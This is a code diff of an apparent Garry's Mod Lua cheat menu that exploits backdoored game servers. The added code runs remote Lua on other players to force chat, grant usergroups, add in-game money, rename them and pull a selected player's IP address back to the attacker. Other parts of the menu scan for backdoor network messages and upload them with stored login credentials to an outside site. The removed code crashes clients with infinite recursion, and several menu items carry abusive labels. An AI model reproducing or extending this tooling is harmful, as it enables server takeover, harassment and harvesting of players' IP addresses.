@@ -1046,8 +1046,11 @@ HookFunc("AltHUDPaint", VisualHook, function()
 
             if ent:IsPlayer() and ent:Alive() and ent:Health() > 0 then
                 if wtf.enable['Tracer'] then
-                    surface.SetDrawColor(wtf.color['Tracer'])
-                    surface.DrawLine(ScrW()/2, ScrH(), ent:GetPos():ToScreen().x, ent:GetPos():ToScreen().y)
+                    local position = ent:GetPos():ToScreen()
+                    if position.x < ScrW() and position.x > 0 then
+                        surface.SetDrawColor(wtf.color['Tracer'])
+                        surface.DrawLine(ScrW()/2, ScrH(), position.x, position.y)
+                    end
                 end
 
                 if wtf.enable['Name'] and wtf.enable['Distance'] then
@@ -1516,7 +1519,7 @@ CreateBDServer("Moan All", function()
 end)
 
 CreateBDServer("Force Say All", function()
-    CreateInputBox("ay", function(str)
+    CreateInputBox("Say", function(str)
         Log("Everyone Just Said: "..str)
         SendLua([[
             for k,v in pairs(player.GetAll()) do
@@ -1711,7 +1714,7 @@ end)
 CreateBDServer("Fuck w/Models", function()
     CreateInputBox("Model", function(str)
         Log("Models: "..str)
-        SendLua([[for k, v in pairs(player.GetAll()) do v:SetModel(]]..str..[[) end]])
+        SendLua([[for k, v in pairs(player.GetAll()) do v:SetModel("]]..str..[[") end]])
     end)
 end)
 
@@ -1733,8 +1736,8 @@ CreateBDServer("Console-Rape", function()
 end)
 
 CreateBDClient("Set Usergroup",  function()
-    CreateInputBox("Set Usergroup", function(str)
-        Log("Player: "..Player(SelectedPlr):Nick().." Usergroup: "..str)
+    CreateInputBox("Usergroup", function(str)
+        Log("Usergroup: "..str)
         SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:SetUserGroup("]]..str..[[")
@@ -1744,7 +1747,7 @@ end)
 
 CreateBDClient("Set JumpPower",  function()
     CreateInputBox("Jump", function(str)
-        Log(Player(SelectedPlr):Nick().." JumpHeight Set")
+        Log("JumpPower: "..str)
         SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:SetJumpPower(]]..str..[[)
@@ -1763,6 +1766,38 @@ CreateBDClient("Set Speed",  function()
     end)
 end)
 
+CreateBDClient("Set Name", function()
+    CreateInputBox("Name", function(str)
+        Log("Set Names: "..str)
+        SendLua([[
+            local str = "]]..str..[["
+            local me = Player(]]..SelectedPlr..[[)
+            DarkRP.storeRPName(me, str)
+            me:setDarkRPVar("rpname", str)
+        ]])
+    end)
+end)
+
+CreateBDClient("Set Model", function()
+    CreateInputBox("Model", function(str)
+        Log("Models: "..str)
+        SendLua([[
+            local me = Player(]]..SelectedPlr..[[)
+            me:SetModel("]]..str..[[") 
+        ]])
+    end)
+end)
+
+CreateBDClient("Add Eco", function()
+    CreateInputBox("Add", function(str)
+        Log("Added: "..str)
+        SendLua([[
+            local me = Player(]]..SelectedPlr..[[)
+            me:addMoney(]]..str..[[) 
+        ]])
+    end)
+end)
+
 CreateBDClient("Ignite", function()
     Log("Everyone Ignited")
     SendLua([[
@@ -1776,6 +1811,15 @@ CreateBDClient("Extinguish", function()
     SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:Extinguish()
+    ]])
+end)
+
+CreateBDClient("Print IP", function()
+    Log("Yoinked that bih!!!")
+    SendLua([[
+        local me = Player(]]..SelectedPlr..[[)
+        local ply = ]]..LocalPlayer():UserID()..[[
+        Player(ply):ChatPrint(me:IPAddress())
     ]])
 end)
 
@@ -1839,13 +1883,8 @@ CreateBDClient("Fling", function()
     ]])
 end)
 
-CreateBDClient("Crash",  function()
-    Log("Player: "..Player(SelectedPlr):Nick().." Crashed")
-    SendLua([[Player(]]..SelectedPlr..[[):Sendlua("function die() return die() end die()")]])
-end)
-
-CreateBDClient("Force Say",  function()
-    CreateInputBox("Force Say", function(str)
+CreateBDClient("Say",  function()
+    CreateInputBox("Say", function(str)
         Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
         SendLua([[
             local me = Player(]]..SelectedPlr..[[)
@@ -1884,7 +1923,7 @@ CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
 end)
 
 CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
-    CreateInputBox("Select Net", function(str)
+    CreateInputBox("Net", function(str)
         if CheckNet(str) then
             SelectedNet=str
             Log("Selected Net "..str)
@@ -1895,7 +1934,7 @@ CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
 end)
 
 CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
-    CreateInputBox("Add Net", function(str)
+    CreateInputBox("Net", function(str)
         local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
         http.Post("https://w0rst.xyz/api/net/upload.php", { username=UserInfo[1], password=UserInfo[2], net=str }, function(b)
             if b[1] == "0" then
